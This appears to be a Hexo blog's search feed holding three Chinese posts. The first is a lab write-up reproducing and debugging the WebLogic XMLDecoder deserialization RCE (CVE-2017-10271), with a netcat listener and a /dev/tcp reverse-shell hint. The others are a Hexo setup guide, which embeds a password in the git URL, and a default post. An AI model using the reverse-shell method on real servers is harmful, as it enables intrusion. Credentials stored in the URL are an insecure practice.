    </entry>
    
    <entry>
      <title>WebLogic XMLDecoder反序列化漏洞</title>
      <link href="/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次接触java反序列化漏洞，之前也不会java，调试的过程比较艰辛，其中一些原理其实也没有太清楚，先整理一篇博客回顾一下再继续往下学习吧。CVE-2017-3506 &amp; CVE-2017-10271漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令，攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接使用github上vulhub中的docker</p><p><code>https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271</code> </p><p>之前我连docker都没用过，参考了这本书入门 <a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="noopener">Docker—从入门到实践</a></p><p>因为要动态调试，需要开启一个远程调试的端口8053，所以将docker-compose.yml文件改动如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">version: &apos;2&apos;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  weblogic:</span><br><span class="line"></span><br><span class="line">    image: vulhub/weblogic</span><br><span class="line"></span><br><span class="line">    ports:</span><br><span class="line"></span><br><span class="line">      - &quot;7001:7001&quot;</span><br><span class="line">      - &quot;8453:8453&quot;</span><br></pre></td></tr></table></figure><p>执行命令 <code>docker-compose up -d</code> 完成搭建，若成功启动，打开浏览器访问<code>http://127.0.0.1:7001</code>应该会出现一个404页面</p><p>docker容器搭建完成后，使用命令<code>docker exec -it weblogic /bin/bash</code> 进入容器</p><p>修改<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code> 文件</p><p>找到如下代码段</p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/1.jpg" title="开启远程调试"><p>添加图中的上面两行代码 原来并没有这两行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br></pre></td></tr></table></figure><p>添加后运行一下这个脚本，退出并重启容器，这样就开启了debug模式，可以<code>docker ps</code>一下查看容器是否开启了8453端口。</p><p>tips：退出容器快捷键 <code>Ctrl+D</code></p><p>因为要远程调试weblogic，而没有源码，所以要把容器中依赖的包拷出来</p><p>使用命令<code>docker cp weblogic:/root/Oracle/Middleware/wlserver_10.3 ./WebLogic_jars</code> </p><p>这是如果你使用的是windows系统会报错，因为windows对命令行下的路径长度有限制，所以要先进到docker里把要拷的文件夹打个包，再拉下来。</p><p>Linux 的打包命令为 <code>zip -r zipname.zip targetdir</code></p><p>docker中好像没有zip命令，需要先<code>apt-get install zip</code>一下，</p><p>然后再执行<code>zip -r wlserver_10.3.zip wlserver_10.3</code></p><p>这部分jar不全，还要将<code>/root/Oracle/Middleware/modules</code> 拷出来</p><h2 id="IDEA远程调试"><a href="#IDEA远程调试" class="headerlink" title="IDEA远程调试"></a>IDEA远程调试</h2><p>使用idea打开wlserver_10.3，将wlserver_10.3/server/lib和modules这两个文件夹添加到library </p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/2.jpg" title="添加library"><p>添加后，就会发现里面的.jar和.war的包都可以点开了，并且可以搜索里面的一些类和字符串了。</p><p>然后开始设置debug，点击<code>Add Configuration...</code></p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/3.jpg" title="添加debug"><p>添加一个Remote设置</p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/4.jpg" title="选择Remote模式"><p>端口设置为8453，并且设置Use module classpath </p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/5.jpg" title="配置debug"><p>点击debug，出现如下字样，说明已经配置ok。</p><p><code>Connected to the target VM, address: &#39;localhost:8453&#39;, transport: &#39;socket&#39;</code></p><p>在wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class中的handle方法下断点，看看能否击中断点。</p> <img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/6.jpg" title="断点尝试"><p>以上，就搭建好了docker环境和调试环境，接下来就可以复现和动态调试了。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>因为对原理其实也是一知半解，所以先用师傅们的poc复现了一下</p><p>现在本地开一个监听端口</p><p><code>nc -l -p 8888</code></p><p>发送如下数据包</p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/7.jpg" title="poc"><p>tips：/dev/tcp/ 后的ip换成自己的即可</p><p>反弹shell成功</p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/8.jpg" title="shell"><p>查看burp中返回的xml数据，可以清晰的看到调用栈，调用栈在&lt;ns2:frame /&gt;标签中 </p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/9.jpg"><p>仔细分析weblogic返回的响应，我们可以大概定位到问题点，我们重点关注&lt;ns2:frame  /&gt;标签中class以weblogic开头的部分，这部分就是weblogic处理我们请求的调用栈逻辑，weblogic处理完后就到了XMLDecoder </p><p>这样，通过漏洞复现，我们得到了weblogic的处理流程如下（为了方便查看，调用栈顺序为从上到下）</p><ul><li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;processRequest</li><li>weblogic.wsee.jaxws.workcontext.WorkContextTube-&gt;readHeaderOld</li><li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;receive</li><li>weblogic.workarea.WorkContextMapImpl-&gt;receiveRequest</li><li>weblogic.workarea.WorkContextLocalMap-&gt;receiveRequest</li><li>weblogic.workarea.spi.WorkContextEntryImpl-&gt;readEntry</li><li>weblogic.wsee.workarea.WorkContextXmlInputAdapter-&gt;readUTF</li></ul><p>至此，漏洞复现已经完成，并根据漏洞复现中得到的信息，为动态调试打下了基础。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>从poc中可以看出，这个漏洞是wls-wsat这个接口出了问题，搜索一下文件，发现了<code>wls-wsat.war</code>这个包，打开后点击<code>web.xml</code>查看有哪些接口</p><img src="/2018/11/03/WebLogic-XMLDecoder反序列化漏洞/10.jpg"><p>进来后发现第一个接口就是我们想要的接口，调用栈和WebLogic servlet的分发机制比较复杂，我也不是很懂emm，只是跟着复现过程发现的函数调用栈跟了一遍流程。</p><p>具体流程如下</p><h3 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public NextAction processRequest(Packet var1) &#123;</span><br><span class="line">        this.isUseOldFormat = false;</span><br><span class="line">        if (var1.getMessage() != null) &#123;</span><br><span class="line">            HeaderList var2 = var1.getMessage().getHeaders();</span><br><span class="line">            Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true);</span><br><span class="line">            if (var3 != null) &#123;</span><br><span class="line">                this.readHeaderOld(var3);</span><br><span class="line">                this.isUseOldFormat = true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true);</span><br><span class="line">            if (var4 != null) &#123;</span><br><span class="line">                this.readHeader(var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.processRequest(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>var1为POST传进来的XML数据，var3是xml的头部解析，如果存在（头不为空），就进入readHeaderOld()方法，跟进readHeaderOld()</p><h3 id="weblogic-wsee-jaxws-workcontext-WorkContextTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextTube</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected void readHeaderOld(Header var1) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        XMLStreamReader var2 = var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter();</span><br><span class="line">        ByteArrayOutputStream var4 = new ByteArrayOutputStream();</span><br><span class="line">        XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));</span><br><span class="line">        this.receive(var6);</span><br><span class="line">    &#125; catch (XMLStreamException var7) &#123;</span><br><span class="line">        throw new WebServiceException(var7);</span><br><span class="line">    &#125; catch (IOException var8) &#123;</span><br><span class="line">        throw new WebServiceException(var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一步processRequest中我们只把头读了进来，其他的数据还在缓冲区中，使用ByteArrayOutputStream函数读取剩余数据到var4。经过一系列的处理后，如果没有问题就创建WorkContextXmlInputAdapter对象 var6，之后跟进receive()</p><h3 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected void receive(WorkContextInput var1) throws IOException &#123;</span><br><span class="line">    WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">    var2.receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进receiveRequest()</p><h3 id="weblogic-workarea-WorkContextMapImpl"><a href="#weblogic-workarea-WorkContextMapImpl" class="headerlink" title="weblogic.workarea.WorkContextMapImpl"></a>weblogic.workarea.WorkContextMapImpl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void receiveRequest(WorkContextInput var1) throws IOException &#123;</span><br><span class="line">    ((WorkContextMapInterceptor)this.getMap()).receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将var1传到了receiveRequest()方法中，继续跟进</p><h3 id="weblogic-workarea-WorkContextLocalMap"><a href="#weblogic-workarea-WorkContextLocalMap" class="headerlink" title="weblogic.workarea.WorkContextLocalMap"></a>weblogic.workarea.WorkContextLocalMap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public void receiveRequest(WorkContextInput var1) throws IOException &#123;</span><br><span class="line">    while(true) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            WorkContextEntry var2 = WorkContextEntryImpl.readEntry(var1);</span><br><span class="line">            if (var2 == WorkContextEntry.NULL_CONTEXT) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String var3 = var2.getName();</span><br><span class="line">            this.map.put(var3, var2);</span><br><span class="line">            if (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(&quot;receiveRequest(&quot; + var2.toString() + &quot;)&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException var4) &#123;</span><br><span class="line">            if (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(&quot;receiveRequest : &quot;, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WorkContextEntryImpl.readEntry(var1);</code>对传进来的数据进行处理，具体的代码好像看不太懂，但是跟进！readEntry()！</p><h3 id="weblogic-workarea-spi-WorkContextEntryImpl"><a href="#weblogic-workarea-spi-WorkContextEntryImpl" class="headerlink" title="weblogic.workarea.spi.WorkContextEntryImpl"></a>weblogic.workarea.spi.WorkContextEntryImpl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">     String var1 = var0.readUTF();</span><br><span class="line">     return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里对var0执行了readUTF()方法，终于看到曙光了，最后一个方法，跟进</p><h3 id="weblogic-wsee-workarea-WorkContextXmlInputAdapter"><a href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter" class="headerlink" title="weblogic.wsee.workarea.WorkContextXmlInputAdapter"></a>weblogic.wsee.workarea.WorkContextXmlInputAdapter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public String readUTF() throws IOException &#123;</span><br><span class="line">return (String)this.xmlDecoder.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>终于执行了readObject()方法，对XMLDecoder对象进行了反序列化，导致远程命令执行。</p><p>不用再跟进了，至此远程动态调试完成。</p><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>WebLogic没有对XML的数据进行任何的过滤，导致可以构造XML数据，反序列化任意对象，从而RCE，这也就是CVE-2017-3506产生的原因。</p><p>这是我第一次对一个漏洞进行完整的复现和调试，其间遇到了许多问题，磕磕绊绊的终于完成了这篇博客，感谢很多师傅的帮助和博客。经过这次尝试，我对java反序列化和漏洞调试有了初步的认识，希望继续努力，早日完成下一篇博客！</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">Weblogic XMLDecoder RCE分析</a></p><p><a href="http://blog.51cto.com/skytina/2055335" target="_blank" rel="noopener">WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271)漏洞分析</a></p><p><a href="http://whip1ash.cn/2018/10/21/weblogic-deserialization/?from=timeline&amp;isappinstalled=0#%E8%AF%B4%E7%82%B9%E5%BA%9F%E8%AF%9D" target="_blank" rel="noopener">从0开始学习WebLogic(Java)反序列化 (1)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> weblogic反序列化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo 从零搭建全过程</title>
      <link href="/2018/10/25/hexo%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B/"/>
      <url>/2018/10/25/hexo%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="hexo-搭建-blog-完整演示"><a href="#hexo-搭建-blog-完整演示" class="headerlink" title="hexo 搭建 blog 完整演示"></a>hexo 搭建 blog 完整演示</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>由于我自己的电脑其实搭建之前就有了各种环境，我也不记得啥时候安的了，稀里糊涂搭建好了，中间遇到了许多问题，这里我从头完整的整理一遍。</p><a id="more"></a><p>本篇博客包含的内容如下：</p><ol><li><p>安装git</p></li><li><p>安装NodeJs</p></li><li><p>配置环境变量</p></li><li><p>安装hexo</p></li><li><p>部署项目并连接</p></li><li><p>使用hexo</p></li><li><p>我遇到的一些问题</p></li></ol><h4 id="1-安装-Git-Bash"><a href="#1-安装-Git-Bash" class="headerlink" title="1.安装 Git Bash"></a>1.安装 Git Bash</h4><p>我用的是windows环境</p><ul><li>下载地址：<a href="https://gitforwindows.org/" target="_blank" rel="noopener">Git for Windows</a></li><li>安装步骤：打开下载好的安装包，一路next，我不记得安装的时候是不是有添加到环境变量选项了，如果有记得选上，大概是 “add to path” 这样的选项，如果没选我后面会说到环境变量的意义和添加方法。后文每个软件安装都会涉及环境变量的问题，就不提了。</li><li>检测安装是否成功：在命令行输入 <code>git version</code>  返回git版本则安装成功</li></ul><h4 id="2-安装-NodeJs"><a href="#2-安装-NodeJs" class="headerlink" title="2.安装 NodeJs"></a>2.安装 NodeJs</h4><p>Hexo 是基于NodeJs 的静态博客，而且安装 NodeJs 后自带的 npm 工具在后面下载 hexo 时会用到。</p><ul><li>下载地址：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.JS</a></li><li>安装步骤：一路next的过程中一样注意环境变量的问题，这样就不用后期自己配了</li><li>查看版本命令：<code>node -v</code></li></ul><h4 id="3-配置环境变量"><a href="#3-配置环境变量" class="headerlink" title="3.配置环境变量"></a>3.配置环境变量</h4><p>什么是环境变量？百度百科给的解释是 环境变量（environment variables）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如：临时文件夹位置和系统文件夹位置等。 </p><p>我们要配置的是Windows中的PATH环境变量 (PATH 中罗列出 shell 输入的执行命令所在的目录) </p><p>我对PATH环境变量的理解是，当你在命令行输入一个命令时，系统会自动从C盘的system文件夹下寻找这个命令，如果没有找到，就会从你设置的PATH环境变量中的文件夹下寻找，所以设置环境变量可以让你更方便地在任何目录下使用你安装的软件命令。</p><p>那么如果安装时忘记添加PATH了，怎么手动配置呢？</p><p>右击我的电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量，然后对Path变量进行编辑，点击右侧的新建选项，这时左侧的变量列表会出现新的空栏，在空栏中输入你要配置的文件目录，应用后重启命令行即可生效。</p><h4 id="4-安装-hexo"><a href="#4-安装-hexo" class="headerlink" title="4.安装 hexo"></a>4.安装 hexo</h4><p> 好了！该下的都下完了，该配的也配完了，这时可以直接使用npm工具安装hexo了。</p><ul><li>安装命令：<code>npm install -g hexo-cli</code></li></ul><p>等待安装完成，如果安装完成后你找不到安装的位置，可以输入 <code>npm config get prefix</code> 命令得到默认安装路径，然后把这个路径添加到环境变量中</p><ul><li>查看版本命令：<code>hexo -v</code></li><li>初始化：新建一个空文件夹作为本地blog目录，命令行切换到该目录下执行 <code>hexo init</code> 进行初始化，初始化后文件夹内会生成一些初始化的文件，稍后会讲解其中要使用到的文件作用。</li></ul><h4 id="5-部署项目并连接"><a href="#5-部署项目并连接" class="headerlink" title="5.部署项目并连接"></a>5.部署项目并连接</h4><p>接下来，在 Git hub 上创建项目并使本机能连接到 Git hub 上</p><ul><li><p>创建一个repo，项目名称为 yourname.github.io (yourname 就是你的git hub用户名)，其他配置使用默认即可</p></li><li><p>回到本机git bash中配置git hub账户信息，依次输入如下几条命令：</p><p><code>git config --global user.name &quot;yourname&quot;</code></p><p><code>git config --global user.email &quot;youremail&quot;</code></p></li><li><p>创建SSH命令</p><p><code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code> </p><p>该命令生成 ssh 密钥，会生成两个文件，一个是私钥，一个是公钥，我们要用到结尾是 .pub 的公钥</p><p>将得到的公钥文件用记事本打开，把内容复制下来，在git hub上settings中的SSH and GPG keys中新建一个SSH key，title栏随便取名，key栏把刚才复制的内容粘贴进去即可。</p></li><li><p>在 git bash 中验证是否成功</p><p>输入  <code>ssh -T git@github.com</code> 命令验证是否添加成功</p><p>成功连接你就可以进行下一步了</p></li></ul><h4 id="6-使用-hexo"><a href="#6-使用-hexo" class="headerlink" title="6.使用 hexo"></a>6.使用 hexo</h4><ul><li>在使用之前先用编辑器打开你blog项目文件夹下的_config.yml文件修改一些配置，添加下面这些配置，其中YourgithubName换成你自己的：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><ul><li><p>回到git bash中，进入你的blog目录，分别执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>打开浏览器输入 localhost:4000 你就可以在本地看到你blog的样子了</p></li><li><p>接下来可以新建一篇博客并推到git hub上去</p><p><code>hexo new &quot;name&quot;</code>  命令新建博客，输入该命令后会在你的blog文件下source/_posts目录下生成一个markdown文档，你可以在这个文档中添加博客内容</p><p><code>hexo g</code>命令生成博客内容</p><p><code>hexo d</code>命令将博客推上去</p></li></ul><p>如果成功了，就可以在浏览器中输入 <a href="http://yourgithubname.github.io" target="_blank" rel="noopener">http://yourgithubname.github.io</a> 看到你的个人博客了</p><h4 id="7-我遇到的一些问题"><a href="#7-我遇到的一些问题" class="headerlink" title="7.我遇到的一些问题"></a>7.我遇到的一些问题</h4><p>在搭建过程中我遇到了两个问题</p><p>我遇到的第一个问题是执行<code>hexo g</code>命令后生成的是空的，然后推也推不上去</p><p>我的解决方法是修改根目录下的 _config.yml 配置文件 修改deploy 节点</p><p>原来我们添加的配置为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>修改为如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://yourname:yourpassword@github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>且要注意每个配置选项的冒号后面要有一个空格，要严格参照规定格式</p><p>我遇到的第二个问题是SSH连接不上，原来在生成SSH密钥的时候，提示输入生成的文件名，我为了方便把它生成到D盘下新建的一个文件夹中，并且改了名字。但在进行SSH连接的时候，好像会默认到你的C盘 C:\Users\user\.ssh 目录下寻找 xx_rsa 密钥文件，所以我把两个密钥复制到了这个目录下并更改了文件名分别为：id_rsq 和 id_rsa.pub 就可以成功连接了。</p><p>如果你没遇到相同的问题就不用做以上修改，在配置的过程中可能会出现千奇百怪的问题，希望你第一次遇到问题时先去google搜索一下，可能相同的问题已经被解答过许多次了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/10/25/hello-world/"/>
      <url>/2018/10/25/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
  
  
</search>
